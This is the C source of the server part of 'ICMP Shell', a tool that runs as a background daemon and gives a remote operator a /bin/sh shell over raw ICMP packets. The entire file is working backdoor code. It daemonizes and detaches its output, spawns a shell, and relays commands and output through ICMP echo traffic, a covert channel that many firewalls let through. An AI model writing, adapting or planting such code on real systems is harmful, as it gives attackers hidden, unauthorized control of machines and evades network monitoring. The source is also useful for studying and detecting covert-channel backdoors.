/* ISHELL: server
 * by: Peter Kieltyka (elux)
 * http://peter.eluks.com / peter@eluks.com */
#include "ishell.h"

/* global variables */
int     ish_debug = 1;

/* function prototypes */
void    usage(char *);
void    sig_handle(int);
int     edaemon(void);
int     ish_listen(int, struct sockaddr *, socklen_t);

void usage(char *program) {
    fprintf(stderr,
    "ICMP Shell v%s  (server)   -   by: Peter Kieltyka\n"
    "usage: %s [options]\n\n"
    "options:\n"
    " -h               Display this screen\n"
    " -d               Run server in debug mode\n"
    " -i <id>          Set session id; range: 0-65535 (default: 1515)\n"
    " -t <type>        Set ICMP type (default: 0)\n"
    " -p <packetsize>  Set packet size (default: 512)\n"
    "\nexample:\n"
    "%s -i 65535 -t 0 -p 1024\n"
    "\n", VERSION, program, program);

    exit(-1);
}

void sig_handle(int empty) {
    (void)empty; // Mark unused.
    return;
}

int edaemon(void) {
    pid_t   pid;
    int     fd;

    if((pid = fork()) < 0) {
        return -1;
    } else if(pid != 0) {
        exit(0);
    }

    setsid();
    chdir("/");
    umask(0);

    if((fd = open("/dev/null", O_WRONLY, 0)) == -1)
        return -1;

    dup2(fd, STDIN_FILENO);
    dup2(fd, STDOUT_FILENO);
    dup2(fd, STDERR_FILENO);
    close(fd);

    return 0;
}

int ish_listen(int sockfd, struct sockaddr *sin, socklen_t sinlen) {
    fd_set  rset;
    int     n, fd, maxfd;
    char    send_buf[ish_info.packetsize], recv_buf[ish_info.packetsize];
    fd = popen2("/bin/sh");
    sendhdr.cntrl = 0;

    while(1) {
        FD_ZERO(&rset);
        FD_SET(fd, &rset);
        FD_SET(sockfd, &rset);
        maxfd = MAX(fd, sockfd) + 1;
        select(maxfd, &rset, NULL, NULL, NULL);
        if(FD_ISSET(sockfd, &rset)) {
            memset(recv_buf, 0, sizeof(recv_buf));
            if(ish_recv(sockfd, recv_buf, sin, sinlen) == CNTRL_CPOUT) {
                write(fd, recv_buf, strlen(recv_buf));
                fprintf(stderr, "-----+ IN DATA +------\n%s", recv_buf);
            }
        }

        if(FD_ISSET(fd, &rset)) {
            memset(send_buf, 0, sizeof(send_buf));
            sendhdr.ts = 0;
            ish_info.seq++;
            if ((n = read(fd, send_buf, sizeof(send_buf)-1)) == 0)
                sendhdr.cntrl |= CNTRL_CEXIT;

            fprintf(stderr, "-----+ OUT DATA +-----\n%s\n", send_buf);
            if (ish_send(sockfd, send_buf, sin, sinlen) < 0)
                error_msg();

            if(n == 0) break;
        }
    }
    pclose2(fd);
    return(0);
}

int main(int argc, char *argv[]) {
    int     opt, sockfd;
    struct  sockaddr_in sin;
    while((opt = getopt(argc, argv, "hdi:t:p:")) != -1) {
        switch(opt) {
        	case 'h':
            	usage(argv[0]);
            	break;
        	case 'd':
            	ish_debug = 0;
            	break;
        	case 'i':
            	ish_info.id = atoi(optarg);
            	break;
        	case 't':
            	ish_info.type = atoi(optarg);
            	break;
        	case 'p':
            	ish_info.packetsize = atoi(optarg);
            	break;
        }
    }

    if(ish_debug) {
        if(edaemon() != 0) {
            fprintf(stderr, "Cannot start server as daemon!\n");
            exit(-1);
        }
    }

    sin.sin_family = AF_INET;
    memset(&(sin.sin_zero), 0, 8);
    if((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1)
        error_msg();

    signal(SIGPIPE, sig_handle);
    while(ish_listen(sockfd, (struct sockaddr *)&sin, sizeof(sin)) == 0);

    close(sockfd);
    exit(0);
}
